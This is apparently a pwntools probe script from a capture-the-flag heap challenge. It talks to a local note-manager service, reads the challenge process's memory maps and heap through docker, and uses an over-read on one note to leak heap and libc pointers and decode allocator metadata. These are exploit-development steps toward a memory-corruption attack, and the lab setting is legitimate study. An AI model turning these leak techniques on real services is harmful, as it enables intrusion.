#!/usr/bin/env python3
"""
Dump brk heap via /proc/PID/mem inside docker and look for libc pointers.
Keep connection open while inspecting.
"""
from pwn import *
import subprocess, struct, time, os, signal

HOST, PORT = "localhost", 11337
context.log_level = 'error'

def alloc(io, idx, sz):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"Enter size: ", str(sz).encode())

def write_note(io, idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)

def read_note(io, idx, sz):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(sz).encode())
    return io.recv(sz, timeout=2)

def docker_exec(cmd):
    r = subprocess.run(["docker", "exec", "atyp_test", "sh", "-c", cmd],
                      capture_output=True, timeout=10)
    return r.stdout, r.stderr

def find_chall_pid():
    """Find the chall process by looking at children of socat"""
    out, _ = docker_exec(
        "for d in /proc/[0-9]*; do "
        "  pid=$(basename $d); "
        "  [ -f $d/status ] || continue; "
        "  ppid=$(grep PPid $d/status 2>/dev/null | awk '{print $2}'); "
        "  if [ \"$pid\" != 1 ] && [ \"$ppid\" != 0 ]; then "
        "    echo $pid; "
        "  fi; "
        "done 2>/dev/null | sort -rn | head -1")
    pid_str = out.decode().strip()
    if pid_str:
        return int(pid_str)
    return None

def probe():
    io = remote(HOST, PORT)

    # Do one interaction first to confirm connection
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"index: ")
    io.sendline(b"0")
    io.recvuntil(b"Enter size: ")
    io.sendline(b"16")

    time.sleep(1)

    pid = find_chall_pid()
    if not pid:
        print("[-] Could not find chall PID")
        io.close()
        return
    print(f"[*] PID: {pid}")

    # Get maps
    out, _ = docker_exec(f"cat /proc/{pid}/maps")
    maps = out.decode()
    print("\n=== MAPS ===")
    print(maps)

    # Parse maps
    libc_base = None
    heap_start = heap_end = 0
    rw_regions = []

    for line in maps.strip().split('\n'):
        parts = line.split()
        addrs = parts[0].split('-')
        start = int(addrs[0], 16)
        end = int(addrs[1], 16)
        perms = parts[1]
        path = parts[5].strip() if len(parts) >= 6 else ''

        if 'libc.so' in path and 'r-x' in perms:
            libc_base = start
        if '[heap]' in path and 'rw' in perms:
            heap_start = start
            heap_end = end
        if 'rw' in perms:
            rw_regions.append((start, end, path))

    if not libc_base:
        print("[-] Could not find libc_base")
        io.close()
        return

    chall_base = libc_base - 0x4000  # known fixed offset
    notes_addr = chall_base + 0x3020

    print(f"\nlibc_base:  0x{libc_base:x}")
    print(f"chall_base: 0x{chall_base:x} (computed)")
    print(f"heap:       0x{heap_start:x}-0x{heap_end:x} ({heap_end-heap_start} bytes)")
    print(f"notes_addr: 0x{notes_addr:x}")

    # Allocate more notes
    for i in range(1, 16):
        alloc(io, i, 0x10)
        write_note(io, i, p64(0xdead0000 + i) + p64(0xcafe0000 + i))

    # write to note 0 too
    write_note(io, 0, p64(0xdead0000) + p64(0xcafe0000))

    time.sleep(0.5)

    # Read heap via /proc/PID/mem
    # Use python3 inside container if available, else dd
    heap_size = heap_end - heap_start
    out, err = docker_exec(
        f"dd if=/proc/{pid}/mem bs={heap_size} skip=1 count=1 "
        f"iflag=skip_bytes,count_bytes skip={heap_start} 2>/dev/null | od -A x -t x1 -v")

    # Parse od output
    heap_data = bytearray(heap_size)
    for line in out.decode().split('\n'):
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        try:
            off = int(parts[0], 16)
        except:
            continue
        for i, byte_str in enumerate(parts[1:]):
            try:
                heap_data[off + i] = int(byte_str, 16)
            except:
                break

    print(f"\nRead {len(heap_data)} bytes from brk heap")

    # Scan for libc pointers
    print(f"\n=== Libc-region pointers on brk heap ===")
    for off in range(0, len(heap_data) - 7, 8):
        val = struct.unpack('<Q', bytes(heap_data[off:off+8]))[0]
        if val == 0:
            continue
        if abs(val - libc_base) < 0x200000:
            delta = val - libc_base
            print(f"  heap+0x{off:04x} (0x{heap_start+off:x}): 0x{val:x} = libc+0x{delta:x}")

    # Scan for brk self-pointers
    print(f"\n=== Brk self-pointers ===")
    for off in range(0, len(heap_data) - 7, 8):
        val = struct.unpack('<Q', bytes(heap_data[off:off+8]))[0]
        if heap_start <= val < heap_end:
            print(f"  heap+0x{off:04x}: 0x{val:x} = heap+0x{val-heap_start:x}")

    # Over-read to get meta ptr
    leaked_data = read_note(io, 14, 0x100)
    ptrs_found = []
    for off in range(0, len(leaked_data) - 7, 8):
        val = u64(leaked_data[off:off+8])
        if val > 0x10000 and val < 0x7fffffffffff:
            ptrs_found.append((off, val))
    print(f"\n=== Over-read pointers from note 14 ===")
    for off, val in ptrs_found:
        region = "?"
        if heap_start <= val < heap_end:
            region = f"heap+0x{val-heap_start:x}"
        elif abs(val - libc_base) < 0x200000:
            region = f"libc+0x{val-libc_base:x}"
        print(f"  +0x{off:02x}: 0x{val:x} ({region})")

    # If we found a meta pointer, dump the meta
    if ptrs_found:
        leaked_meta = ptrs_found[0][1]
        meta_off = leaked_meta - heap_start
        if 0 <= meta_off < len(heap_data) - 40:
            meta_bytes = bytes(heap_data[meta_off:meta_off+40])
            prev, next_, mem = struct.unpack('<QQQ', meta_bytes[0:24])
            avail, freed = struct.unpack('<II', meta_bytes[24:32])
            flags = struct.unpack('<Q', meta_bytes[32:40])[0]

            last_idx = flags & 0x1f
            freeable = (flags >> 5) & 1
            sizeclass = (flags >> 6) & 0x3f
            maplen = flags >> 12

            print(f"\nMeta at 0x{leaked_meta:x} (heap+0x{meta_off:x}):")
            print(f"  prev:      0x{prev:x} ({'heap+0x%x'%(prev-heap_start) if heap_start<=prev<heap_end else '?'})")
            print(f"  next:      0x{next_:x}")
            print(f"  mem:       0x{mem:x} ({'libc+0x%x'%(mem-libc_base) if abs(mem-libc_base)<0x200000 else '?'})")
            print(f"  avail:     0b{avail:032b}")
            print(f"  freed:     0b{freed:032b}")
            print(f"  last_idx:  {last_idx}")
            print(f"  freeable:  {freeable}")
            print(f"  sizeclass: {sizeclass}")
            print(f"  maplen:    {maplen}")

    # Hexdump non-zero parts of brk heap
    print(f"\n=== Brk heap non-zero data ===")
    for off in range(0, len(heap_data), 8):
        val = struct.unpack('<Q', bytes(heap_data[off:off+8]))[0]
        if val != 0:
            print(f"  heap+0x{off:04x}: 0x{val:016x}")

    io.close()

if __name__ == "__main__":
    probe()
